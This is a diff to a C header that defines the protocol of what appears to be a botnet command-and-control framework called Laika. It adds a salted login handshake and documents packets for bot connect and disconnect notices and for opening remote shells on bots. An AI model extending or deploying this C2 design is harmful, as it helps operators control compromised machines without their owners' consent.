@@ -15,6 +15,8 @@
 #define LAIKA_SHELL_DATA_MAX_LENGTH 2048
 #define LAIKA_MAX_SHELLS            16
 
+#define LAIKA_HANDSHAKE_SALT_LEN    32
+
 /*
     first handshake between peer & cnc works as so:
         - peer connects to cnc and sends a LAIKAPKT_HANDSHAKE_REQ with the peer's pubkey, hostname &
@@ -44,19 +46,29 @@ enum
      *   LAIKAPKT_SIZE pktSize;
      *   LAIKAPKT_ID pktID;
      */
-    LAIKAPKT_HANDSHAKE_REQ, /* first packet sent by peer & received by cnc */
+    LAIKAPKT_HANDSHAKE_REQ,
+    /* first packet sent by peer & received by cnc */
     /* layout of LAIKAPKT_HANDSHAKE_REQ: *NOTE* ALL DATA IN THIS PACKET IS SENT IN PLAINTEXT!!
      *   uint8_t laikaMagic[LAIKA_MAGICLEN]; -- LAIKA_MAGIC
      *   uint8_t majorVer;
      *   uint8_t minorVer;
      *   uint8_t osType;
-     *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- freshly generated pubKey to encrypt decrypted
-     * nonce with char hostname[LAIKA_HOSTNAME_LEN]; -- can be empty (ie. all NULL bytes) char
-     * inet[LAIKA_INET_LEN]; -- can be empty (ie. all NULL bytes)
+     *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- peer's public cryptographic key
+     *   char hostname[LAIKA_HOSTNAME_LEN]; -- can be empty (ie. all NULL bytes)
+     *   char inet[LAIKA_INET_LEN]; -- can be empty (ie. all NULL bytes)
      */
     LAIKAPKT_HANDSHAKE_RES,
     /* layout of LAIKAPKT_HANDSHAKE_RES:
      *   uint8_t cncEndian;
+     *   uint8_t cncSalt[LAIKA_HANDSHAKE_SALT_LEN];
+     */
+    LAIKAPKT_PEER_LOGIN_REQ,
+    /* second packet sent by peer & received by cnc there is no response packet. the socket
+    connection will be closed if an unexpected peer type is provided. this is to prove that the peer
+    is the public key they say they are. */
+    /* layout of LAIKAPKT_PEER_LOGIN_REQ
+     *   uint8_t peerType;
+     *   uint8_t cncSalt[LAIKA_HANDSHAKE_SALT_LEN];
      */
     LAIKAPKT_PINGPONG,
     /* layout of LAIKAPKT_PINGPONG:
@@ -78,12 +90,8 @@ enum
      *   char buf[VAR_PACKET_LENGTH-sizeof(uint32_t)];
      */
     /* =======================================[[ Auth ]]======================================== */
-    LAIKAPKT_AUTHENTICATED_HANDSHAKE_REQ, /* second packet sent by authenticated peers (panel).
-                                             there is no response packet */
-    /* layout of LAIKAPKT_STAGE2_HANDSHAKE_REQ
-     *   uint8_t peerType;
-     */
-    LAIKAPKT_AUTHENTICATED_ADD_PEER_RES, /* notification that a peer has connected to the cnc */
+    LAIKAPKT_AUTHENTICATED_ADD_PEER_RES,
+    /* notification that a peer has connected to the cnc */
     /* layout of LAIKAPKT_AUTHENTICATED_ADD_PEER_RES
      *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- pubkey of said bot
      *   char hostname[LAIKA_HOSTNAME_LEN];
@@ -92,14 +100,15 @@ enum
      *   uint8_t peerType;
      *   uint8_t osType;
      */
-    LAIKAPKT_AUTHENTICATED_RMV_PEER_RES, /* notification that a peer has disconnected from the cnc
-                                          */
+    LAIKAPKT_AUTHENTICATED_RMV_PEER_RES,
+    /* notification that a peer has disconnected from the cnc */
     /* layout of LAIKAPKT_AUTHENTICATED_RMV_PEER_RES
      *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- pubkey of said bot
      *   uint8_t peerType;
      */
-    LAIKAPKT_AUTHENTICATED_SHELL_OPEN_REQ, /* panel requesting cnc open a shell on bot. there is no
-                                              response packet, shell is assumed to be open */
+    LAIKAPKT_AUTHENTICATED_SHELL_OPEN_REQ,
+    /* panel requesting cnc open a shell on bot. there is no response packet, shell is assumed to be
+     * open */
     /* layout of LAIKAPKT_AUTHENTICATE_OPEN_SHELL_REQ
      *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- pubkey of said bot
      *   uint16_t cols;
